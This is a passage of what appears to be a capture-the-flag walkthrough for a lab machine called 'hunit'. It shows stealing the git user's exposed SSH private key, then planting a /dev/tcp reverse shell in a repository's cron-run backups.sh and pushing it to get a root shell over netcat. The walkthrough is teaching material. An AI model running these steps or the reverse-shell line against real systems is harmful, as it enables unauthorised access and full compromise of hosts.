@@ -1,0 +1,112 @@
+Git User SSH
+According to /etc/passwd, the git user exists and uses /usr/bin/git-shell as the default shell.
+
+[dademola@hunit git-server]$ grep git /etc/passwd      
+git:x:1005:1005::/home/git:/usr/bin/git-shell
+As referenced in the password file, /home/git exists.
+
+[dademola@hunit git-server]$ ls -l /home 
+total 8
+drwx------ 7 dademola dademola 4096 Jan 14 18:28 dademola
+drwxr-xr-x 4 git      git      4096 Nov  5 22:35 git
+This folder contains a .ssh folder.
+
+[dademola@hunit ~]$ ls -la /home/git
+total 28
+drwxr-xr-x 4 git  git  4096 Nov  5 22:35 .
+drwxr-xr-x 4 root root 4096 Nov  5 22:28 ..
+-rw------- 1 git  git     0 Nov  6 00:26 .bash_history
+-rw-r--r-- 1 git  git    21 Aug  9 16:27 .bash_logout
+-rw-r--r-- 1 git  git    57 Aug  9 16:27 .bash_profile
+-rw-r--r-- 1 git  git   141 Aug  9 16:27 .bashrc
+drwxr-xr-x 2 git  git  4096 Nov  5 22:31 .ssh
+drwxr-xr-x 2 git  git  4096 Nov  5 22:35 git-shell-commands
+Within this folder, we discover an id_rsa private key file.
+
+[dademola@hunit git-server]$ ls -l /home/git/.ssh
+total 12
+-rwxr-xr-x 1 root root  564 Nov  5 22:31 authorized_keys
+-rwxr-xr-x 1 root root 2590 Nov  5 22:31 id_rsa
+-rwxr-xr-x 1 root root  564 Nov  5 22:31 id_rsa.pub
+Interestingly, the authorized_keys and id_rsa.pub files are the same size, and the contents appear identical:
+
+[dademola@hunit ~]$ cat /home/git/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
+[dademola@hunit ~]$ 
+[dademola@hunit ~]$ cat /home/git/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2+L7/MgU/MJ+fYIEXEa1+WA9/qMvFj1kUTBk0dtCODfandxZvNAbBFY1JWUFjOPqxc+NxZNFzunTxYdv3/zkvT9/3iV9dQgH2m2Kkv0QfFJQPEaug/rQf2MlOPQq563LUb7FLK2L75COLqHGa5GtDh7lDqUGfzj8JcCdEfoYtgVHLAkRdC0scLC2WFUSo/sdkBYu0MWdZBXt4wX1EI0FVJYFt5AhNtkNJty2Dk/QffmKg+7rs/KCj1J9JFekE9UEjXd94EgjZXeIv4FDLqx4KPu0eP2k1hkVaOugpUIFmSgt8uxMdGRcMotEgK9wfDXI5ZR/iwU2deRyUcLGwRTp0kP2TuHCcrUSz5CCVdBJLQk6Y/BN+lGStfV3bsrfWuhA/9gZVtkkSLey0CZpneJDVxAzLY1DoRKi6k11B5UXLQThymn80PJrOH++3aKtzp9Q36N0W8JZlsg7qmaX4dY5TdTcDEVNJeZuuMwdqECvEyr8m1TAlq7LDT0Uq3JwQ7fM= root@hunit
+[dademola@hunit ~]$
+A diff reveals that the files are, in fact, identical.
+
+[dademola@hunit ~]$ diff /home/git/.ssh/authorized_keys /home/git/.ssh/id_rsa.pub
+[dademola@hunit ~]$
+Since the id_rsa.pub public key is in the authorized_keys file, we should be able to use the private key to log in via SSH. Let’s copy this private key to our attack machine and apply the proper permissions.
+
+kali@kali:~$ scp -P 43022 dademola@192.168.120.204:/home/git/.ssh/id_rsa .
+dademola@192.168.120.204's password: 
+id_rsa   100% 2590    19.2KB/s   00:00    
+kali@kali:~$
+kali@kali:~$ chmod 0600 id_rsa 
+Next, we’ll attempt to use this private key to log in as the git user.
+
+kali@kali:~$ ssh -p 43022 git@192.168.120.204 -i id_rsa
+git> 
+The key works, and our login attempt is successful!
+
+
+
+
+
+Reverse Shell
+Since this is a git-shell, we should be able to interact with the repository. Let’s clone this repo on our attack machine.
+
+kali@kali:~$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.120.204:/git-server
+Cloning into 'git-server'...
+remote: Enumerating objects: 12, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (12/12), done.
+Resolving deltas: 100% (2/2), done.
+Now we can again attempt to push our changes to the master branch. As before, we’ll first configure our Git identity.
+
+kali@kali:~$ cd git-server
+kali@kali:~/git-server$ git config --global user.name "kali"
+kali@kali:~/git-server$ git config --global user.email "kali@kali.(none)"
+Next, we’ll inject a reverse shell payload into the backups.sh script and make it executable.
+
+kali@kali:~/git-server$ echo "sh -i >& /dev/tcp/192.168.118.8/8080 0>&1" >> backups.sh 
+kali@kali:~/git-server$ chmod +x backups.sh
+Let’s add and commit our changes.
+
+kali@kali:~/git-server$ git add -A
+kali@kali:~/git-server$ git commit -m "pwn"
+[master cb7104c] pwn
+ 1 file changed, 1 insertion(+)
+ mode change 100644 => 100755 backups.sh
+Before pushing our payload, we’ll set up a Netcat listener on port 8080.
+
+kali@kali:~$ nc -lvnp 8080 
+listening on [any] 8080 ...
+Once our listener is ready, we’ll attempt to push to the master branch.
+
+kali@kali:~/git-server$ GIT_SSH_COMMAND='ssh -i ~/id_rsa -p 43022' git push origin master
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+To 192.168.120.204:/git-server
+   b50f4e5..0212790  master -> master
+kali@kali:~/git-server$ 
+The crontab backup file indicates that the pull.sh script runs every two minutes, and the backups.sh script runs every three minutes. Because of this, it may take up to five minutes to determine if our attack was successful.
+
+Once our changes are synchronized, and our payload is executed inside the backups.sh script, we should receive our root user shell.
+
+kali@kali:~$ nc -lvnp 8080 
+listening on [any] 8080 ...
+connect to [192.168.118.8] from (UNKNOWN) [192.168.120.204] 51816
+...
+sh-5.0# whoami
+root
